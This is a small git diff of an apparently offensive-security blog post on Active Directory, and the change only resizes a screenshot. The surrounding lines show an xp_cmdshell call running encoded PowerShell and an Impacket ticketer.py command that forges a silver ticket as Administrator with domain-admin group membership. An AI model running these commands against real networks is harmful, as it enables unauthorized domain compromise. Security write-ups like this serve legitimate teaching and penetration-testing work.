@@ -226,7 +226,7 @@ exec xp_cmdshell 'powershell -enc <encoded_raw_code>'
 - Grants access to only that specific service
 - Like having a key to one room, not the whole building
 
-<img width="1199" height="512" alt="image" src="https://github.com/0xmrsecurity/0xmrsecurity.github.io/blob/main/assets/img/posts/Screenshot%202026-02-07%20232402.png" />
+<img width="800" height="400" alt="image" src="https://github.com/0xmrsecurity/0xmrsecurity.github.io/blob/main/assets/img/posts/Screenshot%202026-02-07%20232402.png" />
 
 ```bash
 ticketer.py -nthash $nthash -domain-sid $Domain_SID -domain $Domain -spn $user/$Full_DOmain:$Port -groups 512,513 -user-id 500 Administrator
